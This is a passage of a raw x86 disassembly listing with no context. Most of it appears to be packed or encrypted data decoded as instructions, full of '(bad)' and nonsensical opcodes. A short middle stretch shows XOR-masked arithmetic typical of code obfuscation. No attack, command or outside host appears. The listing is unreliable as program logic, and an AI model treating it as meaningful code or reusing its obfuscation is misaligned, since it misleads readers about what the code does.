  4133a7:	or     eax,DWORD PTR [edi-0x64]
  4133aa:	add    BYTE PTR [eax],ah
  4133ac:	je     0x41336e
  4133ae:	clc    
  4133af:	retf   0x21a4
  4133b2:	push   esi
  4133b3:	sub    DWORD PTR [esi],0xd2c9fbcd
  4133b9:	or     cl,BYTE PTR [esi+0x49]
  4133bc:	adc    bl,BYTE PTR [edx-0x65a1b9a2]
  4133c2:	enter  0x1a5a,0x9d
  4133c6:	loop   0x4133ac
  4133c8:	jmp    0x413410
  4133ca:	dec    ebp
  4133cb:	(bad)  
  4133cc:	rol    BYTE PTR [edi],1
  4133ce:	push   ecx
  4133cf:	mov    DWORD PTR [edi-0x80],ebx
  4133d2:	mov    dl,0xce
  4133d4:	adc    DWORD PTR [edi+0x46f0eff3],ecx
  4133da:	jb     0x4133cd
  4133dc:	test   ch,bl
  4133de:	cmp    ebx,DWORD PTR [edx]
  4133e0:	add    al,0x6a
  4133e2:	(bad)  
  4133e3:	dec    esp
  4133e4:	mov    dh,0x8e
  4133e6:	lds    esp,FWORD PTR [eax+0x65fb3be0]
  4133ec:	or     DWORD PTR [edi],edx
  4133ee:	cli    
  4133ef:	mov    ds:0x7644656,al
  4133f4:	cmp    ebx,DWORD PTR [esi+0x26db1220]
  4133fa:	loop   0x4133e3
  4133fc:	pusha  
  4133fd:	and    DWORD PTR [ebx+0x2266087],edx
  413403:	pop    ebx
  413404:	ja     0x4133ed
  413406:	clc    
  413407:	mov    al,ds:0x47b8edb
  41340c:	ins    DWORD PTR es:[edi],dx
  41340d:	fsubr  QWORD PTR [edi+eax*1]
  413410:	xchg   DWORD PTR [edi],esp
  413412:	dec    eax
  413413:	idiv   DWORD PTR [ebx-0x7ec7e4dc]
  413419:	jg     0x413493
  41341b:	add    al,0x97
  41341d:	sbb    al,dl
  41341f:	sbb    BYTE PTR [edi+0x35],bl
  413422:	and    dl,BYTE PTR ds:0x5efa4c59
  413428:	shr    BYTE PTR ds:0x8a13b968,0xb9
  41342f:	cmp    ecx,DWORD PTR [edi+edi*2-0x40a8ff97]
  413436:	jbe    0x413452
  413438:	mov    ebp,0x8cd9027f
  41343d:	dec    edx
  41343e:	pop    esi
  41343f:	fdivr  DWORD PTR [eax]
  413441:	sub    al,0x78
  413443:	mov    eax,ds:0xfbc3c714
  413448:	mov    cl,0xae
  41344a:	in     eax,0x3
  41344c:	mov    BYTE PTR [ecx-0x52c61ca0],0xa
  413453:	sub    edi,ecx
  413455:	jne    0x413470
  413457:	push   edx
  413458:	cmc    
  413459:	fwait
  41345a:	push   0x21
  41345c:	push   esi
  41345d:	outs   dx,DWORD PTR ds:[esi]
  41345e:	(bad)  [ebx]
  413460:	jecxz  0x413480
  413462:	aad    0x14
  413464:	mov    eax,ds:0x34124086
  413469:	and    al,0x2d
  41346b:	lahf   
  41346c:	pop    eax
  41346d:	and    bl,0xe6
  413470:	sahf   
  413471:	fcomip st,st(4)
  413473:	push   esp
  413474:	push   esi
  413475:	lods   al,BYTE PTR ds:[esi]
  413476:	cmp    al,0xa
  413478:	pop    ss
  413479:	cmp    DWORD PTR [esi-0x62],eax
  41347c:	sbb    ch,0xb4
  41347f:	adc    edx,DWORD PTR [edi+esi*2]
  413482:	repnz mov al,0x15
  413485:	loope  0x413424
  413487:	mov    ds:0xeeafce6d,al
  41348c:	pop    ss
  41348d:	dec    edi
  41348e:	daa    
  41348f:	lods   eax,DWORD PTR ds:[esi]
  413490:	mov    eax,0x7e9fd08d
  413495:	adc    eax,0x6eeb46d4
  41349a:	int    0x6d
  41349c:	cli    
  41349d:	sbb    DWORD PTR ds:0xd2114dda,esp
  4134a3:	ficom  WORD PTR [eax]
  4134a5:	cmp    al,0xe4
  4134a7:	cmp    al,0xf4
  4134a9:	in     al,0x84
  4134ab:	out    dx,eax
  4134ac:	cmp    esp,ecx
  4134ae:	(bad)  
  4134af:	out    0xf7,eax
  4134b1:	ror    DWORD PTR ds:0xb4d843c6,1
  4134b7:	cld    
  4134b8:	dec    BYTE PTR [edx+0x5e]
  4134bb:	sub    DWORD PTR [esi+eax*8],edx
  4134be:	jl     0x413502
  4134c0:	xchg   ecx,eax
  4134c1:	and    ch,BYTE PTR [edx+0x79c25d9b]
  4134c7:	and    ebp,DWORD PTR [edi+0xb6be8fa]
  4134cd:	bound  edi,QWORD PTR [esi+0x5e1a5501]
  4134d3:	or     al,0x35
  4134d5:	push   0x43
  4134d7:	jecxz  0x413490
  4134d9:	sub    DWORD PTR [edx-0x2],0xd84b6f3e
  4134e0:	fsubr  DWORD PTR [ebx+0x36]
  4134e3:	clc    
  4134e4:	into   
  4134e5:	out    0x4d,eax
  4134e7:	into   
  4134e8:	push   es
  4134e9:	pop    esi
  4134ea:	jl     0x41355b
  4134ec:	push   edx
  4134ed:	dec    ebx
  4134ee:	mov    edi,0xb156c75d
  4134f3:	sbb    BYTE PTR [edx+0xe],cl
  4134f6:	jp     0x4134f9
  4134f8:	push   edi
  4134f9:	addr16 push es
  4134fb:	push   edx
  4134fc:	jg     0x4134cf
  4134fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134ff:	in     eax,dx
  413500:	dec    ebx
  413501:	icebp  
  413502:	ins    BYTE PTR es:[edi],dx
  413503:	mov    edx,0x962f6a5f
  413508:	pop    eax
  413509:	cmp    al,0xf5
  41350b:	retf   
  41350c:	jns    0x413568
  41350e:	inc    esi
  41350f:	push   esp
  413510:	ja     0x41351e
  413512:	les    esi,FWORD PTR [ebp-0x73]
  413515:	test   DWORD PTR [esi],ebp
  413517:	icebp  
  413518:	jmp    0xcd557a86
  41351d:	adc    bl,BYTE PTR [ebp+ebp*1-0x67]
  413521:	cmp    eax,0x9247fbc2
  413526:	cmp    DWORD PTR [eax+0x60],ebx
  413529:	add    eax,0x8f57a689
  41352e:	pop    ebx
  41352f:	ror    DWORD PTR [eax+0x1],cl
  413532:	int3   
  413533:	pop    es
  413534:	cdq    
  413535:	sub    ebx,DWORD PTR [edx]
  413537:	cmp    DWORD PTR [eax+eax*4+0x1c],0xfffffffc
  41353c:	add    edx,ebx
  41353e:	int    0x4f
  413540:	sbb    ebp,esi
  413542:	mov    esi,0xe75b4b5b
  413547:	mov    al,ds:0xf7b7eeb8
  41354c:	fild   DWORD PTR [edi+0x7a]
  41354f:	arpl   WORD PTR [esi-0x51],di
  413552:	xchg   edx,eax
  413553:	test   DWORD PTR [ebx+0x63],ebx
  413556:	(bad)  
  413558:	aaa    
  413559:	mov    ah,0x7
  41355b:	xchg   ebp,eax
  41355c:	dec    edi
  41355d:	mov    ?,WORD PTR [eax]
  41355f:	sbb    eax,0x79de2fc3
  413564:	fmul   QWORD PTR [edx+esi*2+0x10bce93]
  41356b:	sub    DWORD PTR [ebp-0x30],ebp
  41356e:	sub    BYTE PTR [ebx+0x17a76e88],0xfe
  413575:	call   0xee8d:0x914f93c4
  41357c:	(bad)  
  41357d:	in     eax,dx
  41357e:	mov    BYTE PTR [ecx+eiz*8+0x4f],0xdb
  413583:	test   BYTE PTR [esi-0xd6be6d4],dh
  413589:	mov    ds:0x3ea16428,eax
  41358e:	cwde   
  41358f:	jnp    0x41359b
  413591:	cld    
  413592:	and    ah,BYTE PTR [ecx+0x78]
  413595:	push   0x5ece60cd
  41359a:	sbb    BYTE PTR [esi],bh
  41359c:	dec    ecx
  41359d:	fwait
  41359e:	(bad)  
  41359f:	(bad)  
  4135a0:	in     al,dx
  4135a1:	push   ecx
  4135a2:	loopne 0x413524
  4135a4:	popa   
  4135a5:	jb     0x41353a
  4135a7:	jl     0x4135fc
  4135a9:	push   esp
  4135aa:	xchg   BYTE PTR [ebx+ecx*1+0x61800c51],ch
  4135b1:	pop    ecx
  4135b2:	adc    BYTE PTR [esi+0x65a54b83],bh
  4135b8:	(bad)  
  4135b9:	mov    eax,ds:0x459139b
  4135be:	in     eax,dx
  4135bf:	fldenv [esi]
  4135c1:	add    esp,DWORD PTR [ebp+0x1d]
  4135c4:	mov    dl,0x53
  4135c6:	mov    edi,?
  4135c8:	hlt    
  4135c9:	adc    al,0x15
  4135cb:	test   al,0x33
  4135cd:	ficomp DWORD PTR [edi-0x254f5fa0]
  4135d3:	out    dx,eax
  4135d4:	mov    al,ds:0xb1aa0616
  4135d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135da:	mov    WORD PTR [esi],ds
  4135dc:	xor    cl,BYTE PTR [ebx+0x4424f047]
  4135e2:	stos   BYTE PTR es:[edi],al
  4135e3:	sbb    al,0xb
  4135e5:	cli    
  4135e6:	push   cs
  4135e7:	push   ebx
  4135e8:	or     ebp,DWORD PTR [esi+edi*2]
  4135eb:	lods   eax,DWORD PTR ds:[esi]
  4135ec:	stos   BYTE PTR es:[edi],al
  4135ed:	aaa    
  4135ee:	sahf   
  4135ef:	pop    ebx
  4135f0:	jb     0x4135db
  4135f2:	sub    bh,ch
  4135f4:	jmp    0x413603
  4135f6:	mov    dl,0x88
  4135f8:	call   DWORD PTR [ebx+0x5f2db665]
  4135fe:	xor    DWORD PTR [edi-0x45],ebp
  413601:	mov    esp,fs
  413603:	pop    ebx
  413604:	jp     0x4135cf
  413606:	daa    
  413607:	call   0xec93ec83
  41360c:	js     0x41361d
  41360e:	mov    eax,0xafc97fdb
  413613:	mov    eax,ds:0xf4206e8
  413618:	sbb    BYTE PTR [edx-0x36172c67],bl
  41361e:	and    DWORD PTR [ebp-0x72],edx
  413621:	lahf   
  413622:	pop    es
  413623:	enter  0x902e,0xa9
  413627:	daa    
  413628:	mov    dh,dl
  41362a:	xor    DWORD PTR [ecx-0x10],edx
  41362d:	sub    WORD PTR [eax],bx
  413630:	and    al,0x74
  413632:	in     eax,0x2a
  413634:	push   ebx
  413635:	ins    DWORD PTR es:[edi],dx
  413636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413637:	repnz or al,0xd2
  41363a:	dec    eax
  41363b:	retf   
  41363c:	aas    
  41363d:	mov    eax,ds:0x214f105e
  413642:	push   ecx
  413643:	cli    
  413644:	cmp    bl,BYTE PTR [ebp-0x6802b3dd]
  41364a:	clc    
  41364b:	inc    ecx
  41364c:	sub    al,0xc
  41364e:	fbld   TBYTE PTR [ebx-0x63]
  413651:	push   edi
  413652:	lock sbb al,0xbf
  413655:	inc    eax
  413656:	inc    edx
  413657:	sbb    ch,0x98
  41365a:	es push ecx
  41365c:	div    BYTE PTR [eax-0x4acfb3f4]
  413662:	hlt    
  413663:	dec    ebx
  413664:	lods   al,BYTE PTR ds:[esi]
  413665:	mov    edx,DWORD PTR [ebp+0x31]
  413668:	add    bl,BYTE PTR [ebp+edi*1-0x6a69a64b]
  41366f:	adc    ch,BYTE PTR [ebp+0x25]
  413672:	out    dx,eax
  413673:	push   0x34
  413675:	push   eax
  413676:	pop    ebx
  413677:	shl    DWORD PTR [edx],cl
  413679:	daa    
  41367a:	addr16 loopne 0x4136c6
  41367d:	mov    ch,0x38
  41367f:	pop    edi
  413680:	aam    0x77
  413682:	call   0xe458:0x233e609a
  413689:	call   0xb138:0xf368f0b2
  413690:	outs   dx,DWORD PTR ds:[esi]
  413691:	add    DWORD PTR [edx+0x4f],ebp
  413694:	sub    al,0x74
  413696:	ja     0x41365f
  413698:	fild   WORD PTR [ebx]
  41369a:	test   eax,0xc7079ad1
  41369f:	addr16 mov al,0xc7
  4136a2:	and    al,0x40
  4136a4:	addr16 hlt 
  4136a6:	xchg   DWORD PTR [edi],eax
  4136a8:	xor    dh,BYTE PTR [esi-0x28de8e35]
  4136ae:	and    eax,0xb5580f24
  4136b3:	loope  0x41372d
  4136b5:	imul   ebx,DWORD PTR [ecx],0xc
  4136b8:	or     BYTE PTR [eax],dl
  4136ba:	sub    cl,BYTE PTR [edi+0x6b13b348]
  4136c0:	mov    ebx,DWORD PTR [ebp-0xc]
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0x1
  413798:	pop    ds
  413799:	sbb    al,0x95
  41379b:	mov    ds:0xcd62626b,al
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx-0x5d]
  4137a4:	sub    BYTE PTR [edi],dh
  4137a6:	inc    esp
  4137a7:	pop    eax
  4137a8:	in     al,dx
  4137a9:	push   edi
  4137aa:	sbb    ebx,ebx
  4137ac:	dec    eax
  4137ad:	fst    DWORD PTR [eax]
  4137af:	repz jno 0x413757
  4137b2:	js     0x41376e
  4137b4:	inc    edi
  4137b5:	loop   0x4137b1
  4137b7:	iret   
  4137b8:	loop   0x41380a
  4137ba:	dec    ebp
  4137bb:	inc    esp
  4137bc:	inc    ebx
  4137bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137be:	pop    edx
  4137bf:	xor    ah,dh
  4137c1:	push   es
  4137c2:	(bad)  
  4137c3:	fcomp  QWORD PTR [edx+0x9]
  4137c6:	mov    al,ds:0xd18741
  4137cb:	outs   dx,BYTE PTR ds:[esi]
  4137cc:	fcmovne st,st(1)
  4137ce:	in     al,dx
  4137cf:	mov    ds:0x96a03672,eax
  4137d4:	leave  
  4137d5:	xor    eax,0x7a4aaa52
  4137da:	(bad)  
  4137db:	jmp    0xda5f6037
  4137e0:	and    cl,bh
  4137e2:	sar    DWORD PTR [ebx+edx*4],0x8e
  4137e6:	jl     0x41384f
  4137e8:	add    BYTE PTR [esi+0x7e],al
  4137eb:	and    al,0xec
  4137ed:	mov    dl,ah
  4137ef:	(bad)  [ecx]
  4137f1:	mov    edx,esi
  4137f3:	rcr    BYTE PTR [edi+0x6c6c4c0c],cl
  4137f9:	sub    eax,0xfad63cf4
  4137fe:	sar    BYTE PTR [ecx+0x30e38360],cl
  413804:	cwde   
  413805:	adc    dh,BYTE PTR [edx-0x76]
  413808:	pop    edx
  413809:	cmp    DWORD PTR [ebp+0x1b9b6a97],ebx
  41380f:	mov    ah,0x23
  413811:	js     0x413852
  413813:	inc    DWORD PTR [edi+0x29]
  413816:	aaa    
  413817:	sub    al,0x45
  413819:	mov    eax,0x76b01cc2
  41381e:	xchg   ebx,eax
  41381f:	jb     0x41383e
  413821:	mov    cl,0xab
  413823:	inc    edx
  413824:	stos   BYTE PTR es:[edi],al
  413825:	sub    eax,0x64881afd
  41382a:	pop    edi
  41382b:	out    dx,al
  41382c:	push   es
  41382d:	nop
  41382e:	push   es
  41382f:	dec    edi
  413830:	imul   ebp,ebx,0x7a3079ed
  413836:	cmp    edx,DWORD PTR [esp+esi*1+0x730b27e6]
  41383d:	and    BYTE PTR [ebx+0x45fca2c],bh
  413843:	iret   
  413844:	aaa    
  413845:	mov    es,WORD PTR [ebp+0x6ed9b829]
  41384b:	cdq    
  41384c:	bound  eax,QWORD PTR [eax]
  41384e:	test   al,0xfd
  413850:	dec    edi
  413851:	ins    BYTE PTR es:[edi],dx
  413852:	loope  0x413834
  413854:	or     al,0xee
  413856:	add    edi,0x4687beae
  41385c:	or     edi,ebx
  41385e:	(bad)  
  41385f:	lods   al,BYTE PTR ds:[esi]
  413860:	dec    ecx
  413861:	add    BYTE PTR [eax],0xc8
  413864:	ins    DWORD PTR es:[edi],dx
  413865:	adc    al,0xe4
  413867:	pop    eax
  413868:	sub    DWORD PTR [edi],ebx
  41386a:	(bad)  
  41386b:	xchg   edx,eax
  41386c:	leave  
  41386d:	inc    edx
  41386e:	inc    ebx
  41386f:	dec    edi
  413870:	mov    ss,WORD PTR [ebp-0x3968301d]
  413876:	or     edi,esp
  413878:	or     eax,0x2e4421e3
  41387d:	data16 in al,0x6c
  413880:	pop    eax
  413881:	daa    
  413882:	lock pop eax
  413884:	mov    dl,0x6
  413886:	das    
  413887:	loope  0x4138d5
  413889:	mov    ecx,0xd21cbc36
  41388e:	(bad)  
  41388f:	jne    0x413866
  413891:	les    esi,FWORD PTR [edx-0x5]
  413894:	loop   0x4138a3
  413896:	jo     0x4138e3
  413898:	test   al,0x1f
  41389a:	xor    eax,0x58524dc
  41389f:	jg     0x4138f3
  4138a1:	xchg   ecx,eax
  4138a2:	(bad)  
  4138a3:	repz leave 
  4138a5:	ficomp WORD PTR [esi]
  4138a7:	pop    esp
  4138a8:	xor    al,0x81
  4138aa:	outs   dx,DWORD PTR ds:[esi]
  4138ab:	xchg   ecx,eax
  4138ac:	mov    edi,0x38ae0fbc
  4138b1:	(bad)  
  4138b2:	clc    
  4138b3:	imul   ecx,DWORD PTR [eax-0x67],0x32
  4138b7:	mov    DWORD PTR [eax+edi*1],0x1c78dcad
  4138be:	or     bl,al
  4138c0:	push   ebx
  4138c1:	lods   al,BYTE PTR ds:[esi]
  4138c2:	sbb    bh,BYTE PTR [edx+0x43952d89]
  4138c8:	xor    edi,DWORD PTR [ebx]
  4138ca:	rcl    BYTE PTR [ebx],cl
  4138cc:	xlat   BYTE PTR ds:[ebx]
  4138cd:	sub    bl,cl
  4138cf:	xor    ch,BYTE PTR [edx-0x5f]
  4138d2:	gs fistp DWORD PTR gs:[ebx+0x39]
  4138d7:	cmc    
  4138d8:	imul   edi,DWORD PTR [edx+0x48],0x7aebea13
  4138df:	test   al,0xca
  4138e1:	fsubr  st(0),st
  4138e3:	je     0x4138cf
  4138e5:	add    BYTE PTR [ebx+0x770a6b0f],bh
  4138eb:	push   esp
  4138ec:	sbb    al,0xa5
  4138ee:	fucomip st,st(1)
  4138f0:	inc    ebx
  4138f1:	lock mov bl,0x2a
  4138f4:	mov    ebp,0x550609db
  4138f9:	test   al,dl
  4138fb:	pop    eax
  4138fc:	lods   al,BYTE PTR ds:[esi]
  4138fd:	cmc    
  4138fe:	sub    bh,BYTE PTR [eax-0x81bcc58]
  413904:	stc    
  413905:	sub    edx,DWORD PTR [edx+edx*2-0x79]
  413909:	mov    ebx,0x7ecf5c8d
  41390e:	dec    edi
  41390f:	jne    0x41395c
  413911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413912:	in     al,0x98
  413914:	cdq    
  413915:	in     eax,dx
  413916:	push   ebp
  413917:	push   esp
  413918:	fs scas al,BYTE PTR es:[edi]
  41391a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41391b:	test   eax,0xd05de053
  413920:	push   DWORD PTR ds:0x51f2e958
  413926:	jecxz  0x413954
  413928:	mov    bl,0xc8
  41392a:	cdq    
  41392b:	iret   
  41392c:	push   esi
  41392d:	icebp  
  41392e:	fsubr  DWORD PTR [edx+0x6aedf52c]
  413934:	dec    esi
  413935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413936:	fsub   st,st(2)
  413938:	jl     0x413990
  41393a:	xchg   ecx,eax
  41393b:	fstp   QWORD PTR [ebx+0x11]
  41393e:	mov    ds:0x6de6a0fe,al
  413943:	test   DWORD PTR ds:0x7f285466,eax
  413949:	mov    BYTE PTR [eax+0x41a0739a],cl
  41394f:	mov    ebx,0x4d0beec5
  413954:	test   eax,0x4fc05ea9
  413959:	ins    DWORD PTR es:[edi],dx
  41395a:	lods   al,BYTE PTR ds:[esi]
  41395b:	sbb    BYTE PTR [ebp-0x1bd099cc],dl
  413961:	jmp    0x5f78e896
  413966:	fsub   QWORD PTR gs:[esi+0x57]
  41396a:	fisubr WORD PTR [esi+0x52]
  41396d:	loop   0x41392a
  41396f:	jmp    0x33ba:0x5cc1d0bf
  413976:	sti    
  413977:	mov    cl,0x96
  413979:	pop    ds
  41397a:	outs   dx,DWORD PTR ds:[esi]
  41397b:	in     al,dx
  41397c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41397d:	adc    al,0x91
  41397f:	aam    0x68
  413981:	leave  
  413982:	les    esp,FWORD PTR [ebx+0x7afbc4bd]
  413988:	mov    dl,0xa4
  41398a:	in     al,0x4
  41398c:	sub    DWORD PTR [edx],eax
  41398e:	in     eax,dx
  41398f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413990:	sub    BYTE PTR [edx+edi*4+0x3fef8ebd],bh
  413997:	or     al,0x12
  413999:	les    esi,FWORD PTR ds:0x3b752d76
  41399f:	xchg   ebp,eax
  4139a0:	pop    ecx
  4139a1:	xor    esp,DWORD PTR [edi+0x1678bb6a]
  4139a7:	xchg   edx,eax
  4139a8:	push   edi
  4139a9:	retf   0x68ed
  4139ac:	add    eax,0xb087e200
  4139b1:	sar    BYTE PTR [edi+0x55],1
  4139b4:	fcmove st,st(7)
  4139b6:	iret   
  4139b7:	nop
  4139b8:	mov    ebp,DWORD PTR [edx]
  4139ba:	cmp    BYTE PTR [edi],bh
  4139bc:	jb     0x413a2e
  4139be:	push   0x56
  4139c0:	cli    
  4139c1:	fidivr WORD PTR [edx]
  4139c3:	cli    
  4139c4:	ret    
  4139c5:	jp     0x413a42
  4139c7:	jge    0x4139b4
  4139c9:	or     DWORD PTR [edx],0x53e2b3dc
  4139cf:	xchg   ecx,eax
  4139d0:	arpl   bx,bx
  4139d2:	push   esi
  4139d3:	push   esi
  4139d4:	mov    ebx,DWORD PTR [edi+edx*1]
  4139d7:	cmp    DWORD PTR [edx+0x52156715],0xe1f2dcc8
  4139e1:	adc    edx,DWORD PTR [ecx-0x449acca4]
  4139e7:	jne    0x413a21
  4139e9:	push   ss
  4139ea:	enter  0x356a,0xb0
  4139ee:	imul   edx,DWORD PTR [eax],0x57e664a
  4139f4:	scas   al,BYTE PTR es:[edi]
  4139f5:	jp     0x41399c
  4139f7:	pop    ebx
  4139f8:	xchg   ecx,eax
  4139f9:	jns    0x4139a4
  4139fb:	mov    ah,0x37
  4139fd:	iret   
  4139fe:	sti    
  4139ff:	cld    
  413a00:	cld    
  413a01:	(bad)  
  413a02:	outs   dx,DWORD PTR ds:[esi]
  413a03:	dec    eax
  413a04:	mov    ds:0x575e4168,al
  413a09:	jmp    0x225:0xe1b2ce8a
  413a10:	push   eax
  413a11:	mov    DWORD PTR [edi+ebx*8+0x2d],edi
  413a15:	sbb    bh,dh
  413a17:	aaa    
  413a18:	in     eax,dx
  413a19:	xchg   eax,edx
  413a1b:	mov    ch,0xb8
  413a1d:	inc    ebx
  413a1e:	outs   dx,DWORD PTR ds:[esi]
  413a1f:	push   esi
  413a20:	cld    
  413a21:	mov    dh,0xe1
  413a23:	imul   esi,DWORD PTR [ebp-0x4e],0xb12ceaf0
  413a2a:	push   ebx
  413a2b:	loop   0x413a92
  413a2d:	add    al,0xb9
  413a2f:	xchg   esi,eax
  413a30:	mov    eax,ds:0x76b1e851
  413a35:	sar    DWORD PTR ds:0x8076cb6a,0x21
  413a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a3d:	cs pop esi
  413a3f:	sbb    esp,eax
  413a41:	lahf   
  413a42:	shl    dl,1
  413a44:	sbb    BYTE PTR [eax-0x80],dl
  413a47:	and    al,0xd5
  413a49:	test   BYTE PTR [edi],0x30
  413a4c:	leave  
  413a4d:	jp     0x413a86
  413a4f:	push   ebp
  413a50:	retf   
  413a51:	ja     0x413a12
  413a53:	mov    edi,DWORD PTR [eax]
  413a55:	adc    edx,eax
  413a57:	bound  ecx,QWORD PTR [ecx]
  413a59:	cmp    bl,dl
  413a5b:	ins    DWORD PTR es:[edi],dx
  413a5c:	and    dl,BYTE PTR [edi+0x3a]
  413a5f:	xor    bh,bh
  413a61:	jbe    0x413a10
  413a63:	sub    edx,edi
  413a65:	push   esi
  413a66:	scas   al,BYTE PTR es:[edi]
  413a67:	xor    dl,al
  413a69:	imul   edi,eax,0xffffff95
  413a6c:	mov    ah,0x4f
  413a6e:	int3   
  413a6f:	mov    ebp,0x3ce6502e
  413a74:	mov    ah,0x27
  413a76:	(bad)  
  413a77:	lds    ebp,FWORD PTR [ebx+0x3b]
  413a7a:	retf   0x878f
  413a7d:	pop    ds
  413a7e:	or     edx,0xffffffce
  413a81:	xor    BYTE PTR ds:[ecx],al
  413a84:	sti    
  413a85:	mov    ah,BYTE PTR [ebx]
  413a87:	test   al,0x2e
  413a89:	and    BYTE PTR [ebp-0x3f57434e],ah
  413a8f:	lahf   
  413a90:	hlt    
  413a91:	sbb    bl,cl
  413a93:	sahf   
  413a94:	dec    ebp
  413a95:	adc    esi,DWORD PTR [edx+0x63b175c0]
  413a9b:	int3   
  413a9c:	mov    ds:0x2a23921a,al
  413aa1:	rol    dh,0xe0
  413aa4:	mov    edx,0x9a643e74
  413aa9:	mov    eax,DWORD PTR [edi]
  413aab:	inc    esp
  413aac:	fsub   st,st(7)
  413aae:	or     al,0xdc
  413ab0:	loope  0x413ad6
  413ab2:	dec    eax
  413ab3:	pop    ds
  413ab4:	adc    al,0xe4
  413ab6:	push   ss
  413ab7:	sahf   
  413ab8:	jecxz  0x413abf
  413aba:	in     eax,dx
  413abb:	ficomp DWORD PTR [edi-0x17]
  413abe:	in     eax,dx
  413abf:	and    al,BYTE PTR [edx]
  413ac1:	mov    bh,0x3
  413ac3:	sub    ecx,DWORD PTR [ecx+0x60d39730]
  413ac9:	call   0x5201447c
  413ace:	leave  
  413acf:	push   eax
  413ad0:	mov    cl,0x40
  413ad2:	ret    
  413ad3:	rcr    DWORD PTR [ebx],1
  413ad5:	ds les edx,FWORD PTR ss:[eax+edi*8-0x25]
  413adb:	das    
  413adc:	leave  
  413add:	mov    al,ds:0x83cfb9ef
  413ae2:	ss in  eax,0x90
  413ae5:	cmp    bl,BYTE PTR [esi-0x52]
  413ae8:	adc    ebp,DWORD PTR [ebp+0x4d]
  413aeb:	adc    eax,DWORD PTR [ecx]
  413aed:	adc    dh,BYTE PTR [ebx+edx*1]
  413af0:	xor    ecx,esp
  413af2:	pop    esp
  413af3:	xor    ecx,DWORD PTR [edx]
  413af5:	repz sub DWORD PTR ds:0xbf3a4023,0x14ede585
  413b00:	imul   esi,DWORD PTR [esi+0x495c6c8a],0x3af0e34
  413b0a:	lods   eax,DWORD PTR ds:[esi]
  413b0b:	xchg   dl,ah
  413b0d:	inc    BYTE PTR [ebx-0x58]
  413b10:	pop    ebp
  413b11:	jbe    0x413b49
  413b13:	sbb    ecx,ebp
  413b15:	mov    esi,0xb4f1a466
  413b1a:	add    BYTE PTR [edx],ch
  413b1c:	pushf  
  413b1d:	repnz pop ss
  413b1f:	pop    ss
  413b20:	in     al,dx
  413b21:	add    DWORD PTR [ebx+ebp*8],esp
  413b24:	test   BYTE PTR [esi-0x7b663eda],dh
  413b2a:	call   0xfd358511
  413b2f:	sub    BYTE PTR [edx+eiz*2-0x47],bl
  413b33:	test   al,0x99
  413b35:	push   ecx
  413b36:	aad    0x3d
  413b38:	mov    edi,0x6eef54cc
  413b3d:	das    
  413b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b3f:	daa    
  413b40:	push   esp
  413b41:	push   0xffffffd3
  413b43:	pop    ds
  413b44:	or     al,0x62
  413b46:	pop    esp
  413b47:	(bad)  
  413b48:	fisubr DWORD PTR [edi-0xf]
  413b4b:	enter  0x327a,0x9b
  413b4f:	xchg   edx,eax
  413b50:	push   es
  413b51:	into   
  413b52:	and    al,0xd
  413b54:	pop    ecx
  413b55:	mov    dh,dh
